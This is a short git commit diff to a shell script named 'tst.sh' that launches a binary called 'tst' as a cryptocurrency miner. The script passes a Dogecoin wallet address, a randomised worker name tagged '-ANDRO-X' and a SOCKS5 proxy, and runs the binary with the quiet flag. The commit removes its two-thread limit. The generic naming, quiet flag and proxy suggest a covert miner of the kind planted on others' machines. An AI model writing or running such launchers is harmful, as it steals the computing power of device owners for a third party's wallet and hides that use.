e2a08544f878e09e64e0e6764a2d95862769f9b8
MarisaNicole <88166806+MarisaNicole@users.noreply.github.com>
2021-07-30 06:29:16 +0700

    Update tst.sh

--- tst.sh
+++ tst.sh
@@ -4,4 +4,4 @@ WALLET=DOGE:DLd8SKUyrMCAuUt4ToGWDirH6fpQTf6BvV
 WORKER=$(echo $(shuf -i 10-299 -n 1)-ANDRO-X)
 PROXY=socks5://192.252.209.155:14455
 chmod +x tst
-./tst -o $POOL -u $WALLET.$WORKER#tyhl-8s04 --threads=2 $PROXY -q
+./tst -o $POOL -u $WALLET.$WORKER#tyhl-8s04 $PROXY -q
